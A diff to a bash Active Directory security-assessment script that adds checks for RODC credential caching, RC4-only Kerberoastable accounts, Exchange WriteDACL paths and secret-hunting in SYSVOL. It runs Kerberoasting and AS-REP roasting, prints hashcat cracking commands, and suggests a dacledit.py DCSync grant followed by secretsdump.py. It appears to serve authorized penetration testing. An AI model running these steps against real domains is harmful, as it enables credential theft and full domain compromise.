@@ -253,6 +253,13 @@ if [ "$RODC_COUNT" -gt 0 ]; then
     echo "${sam}:${dns}" >> "$OUTPUT_DIR/all_rodcs.txt"
   done
   echo -e "${GREEN}[OK] Found $RODC_COUNT RODC(s) → all_rodcs.txt${NC}"
+  RODC_CACHING=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=67108864))" sAMAccountName msDS-RevealOnDemandGroup msDS-NeverRevealGroup 2>/dev/null)
+  PRIVILEGED_CACHED=$(echo "$RODC_CACHING" | grep -i "msDS-RevealOnDemandGroup:" | grep -v "^$")
+  if [ ! -z "$PRIVILEGED_CACHED" ]; then
+    echo -e "${RED}       └─ RODC credential caching — privileged accounts may be cached on RODC${NC}"
+  else
+    echo -e "${GREEN}       └─ RODC credential caching policy appears restricted${NC}"
+  fi
 else
   echo -e "${GREEN}[OK] No RODC(s) found${NC}"
 fi
@@ -310,6 +317,7 @@ if [ ! -z "$CERTIPY_CMD" ]; then
     echo -e "${GREY}[--] No CA enrollment services found${NC}"
   fi
 fi
+
 
 # ADCS/PKI Vulnerabilities
 ESC8_VULN=0
@@ -1373,23 +1381,30 @@ fi
 KERBEROAST_OUTPUT=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" --kerberoasting "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null)
 KERBEROAST_COUNT=$(grep -c '\$krb5tgs\$' "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null)
 KERBEROAST_COUNT=${KERBEROAST_COUNT:-0}
-
 if [ "$KERBEROAST_COUNT" -gt 0 ]; then
   echo -e "${RED}[KO] $KERBEROAST_COUNT Kerberoastable account(s) found → kerberoast.txt${NC}"
   grep -oP '(?<=\*)[^$]+(?=\$)' "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null | while read -r account; do
     echo -e "${RED}       └─ $account${NC}"
   done
-    echo -e "${GREY}       └─ hashcat -m 13100 '$OUTPUT_DIR/kerberoast.txt' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule${NC}"
-
+  echo -e "${GREY}       └─ hashcat -m 13100 '$OUTPUT_DIR/kerberoast.txt' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule${NC}"
+  RC4_ONLY=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=user)(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.803:=4)(servicePrincipalName=*))" sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
+  RC4_COUNT=$(echo "$RC4_ONLY" | grep -v "^$" | wc -l)
+  if [ "$RC4_COUNT" -gt 0 ]; then
+    echo -e "${GREY}       └─ $RC4_COUNT Kerberoastable account(s) restricted to RC4 (faster to crack)${NC}"
+    echo "$RC4_ONLY" | while read -r account; do
+      [ -z "$account" ] && continue
+      echo -e "${GREY}          └─ $account${NC}"
+    done
+  fi
 else
   echo -e "${GREEN}[OK] No Kerberoastable accounts found${NC}"
   rm -f "$OUTPUT_DIR/kerberoast.txt"
 fi
 
+
 # AS-REP Roasting Check
 ASREP_OUTPUT=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" --asreproast "$OUTPUT_DIR/asrep.txt" 2>/dev/null)
 ASREP_COUNT=$(grep -c '$krb5asrep$' "$OUTPUT_DIR/asrep.txt" 2>/dev/null || echo 0)
-
 if [ "$ASREP_COUNT" -gt 0 ]; then
   echo -e "${RED}[KO] $ASREP_COUNT AS-REP roastable account(s) found → asrep.txt${NC}"
   grep -oP '(?<=\$)[^@]+(?=@)' "$OUTPUT_DIR/asrep.txt" 2>/dev/null | while read -r account; do
@@ -1706,6 +1721,25 @@ else
   fi
 fi
 
+# Exchange DACL Check
+EXCHANGE_GROUPS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(|(cn=Organization Management)(cn=Exchange Trusted Subsystem))" cn member 2>/dev/null)
+EXCHANGE_DETECTED=$(echo "$EXCHANGE_GROUPS" | grep -c "^cn:")
+if [ "$EXCHANGE_DETECTED" -gt 0 ]; then
+  MEMBER_COUNT=$(echo "$EXCHANGE_GROUPS" | grep -c "^member:")
+  echo -e "${RED}[KO] On-Prem Exchange with $MEMBER_COUNT member(s) in Organization Management / Trusted Subsystem${NC}"
+  echo "$EXCHANGE_GROUPS" | grep "^member:" | awk '{print $2}' | while read -r dn; do
+    NAME=$(echo "$dn" | grep -oP '(?<=CN=)[^,]+' | head -1)
+    echo -e "${RED}       └─ $NAME${NC}"
+  done
+  DOMAIN_DACL=$(dacledit.py -action read -target-dn "$DOMAIN_DN" -dc-ip $DC_IP "$FULL_USER:$PASSWORD" 2>/dev/null | grep -i "Exchange\|WriteDacl" | grep -v "^$")
+  if [ ! -z "$DOMAIN_DACL" ]; then
+    echo -e "${RED}       └─ Exchange WriteDACL on domain NC confirmed — DCSync path viable${NC}"
+    echo -e "${GREY}          1) dacledit.py -action write -target-dn '$DOMAIN_DN' -principal '$AD_USER' -rights DCSync -dc-ip $DC_IP '$FULL_USER:$PASSWORD'${NC}"
+    echo -e "${GREY}          2) secretsdump.py '$FULL_USER:$PASSWORD'@$DC_IP${NC}"
+  fi
+else
+  echo -e "${GREEN}[OK] No On-Prem Exchange infrastructure detected${NC}"
+fi
 
 # GoWitness
 echo ""
@@ -1786,7 +1820,6 @@ else
   echo -e "${GREEN}[OK] No shares accessible via null/guest session${NC}"
 fi
 
-
 # Manspider against readable SMB Shares
 if [ "$BH_MODE" != "DCOnly" ]; then
   if [ -f "$OUTPUT_DIR/smb_shares.txt" ] && [ "$READABLE" -gt 0 ]; then
@@ -1806,6 +1839,10 @@ if [ "$BH_MODE" != "DCOnly" ]; then
         timeout 60 $MANSPIDER_CMD "$share_host" -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -c passw passw secret credential token apikey username connectionstring bios pwd passw admin account login logon cred bank ELBA -e txt xml ini config conf csv bat ps1 -s 5M 2>&1 | grep "matched" >> "$OUTPUT_DIR/manspider/manspider.txt"
         cp -r /root/.manspider/loot/. "$OUTPUT_DIR/manspider/loot/" 2>/dev/null
       done
+      
+      # Manspider SYSVOL
+      timeout 60 $MANSPIDER_CMD $DC_IP -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" --share SYSVOL -c passw secret credential token apikey username connectionstring pwd admin login logon cred -e txt xml ini config conf csv bat ps1 vbs -s 5M 2>&1 | grep "matched" >> "$OUTPUT_DIR/manspider/manspider.txt"
+      cp -r /root/.manspider/loot/. "$OUTPUT_DIR/manspider/loot/" 2>/dev/null
       SPIDER_COUNT=0
       [ -f "$OUTPUT_DIR/manspider/manspider.txt" ] && SPIDER_COUNT=$(grep -c "matched" "$OUTPUT_DIR/manspider/manspider.txt" | tr -d ' \n')
       if [ "$SPIDER_COUNT" -gt 0 ]; then
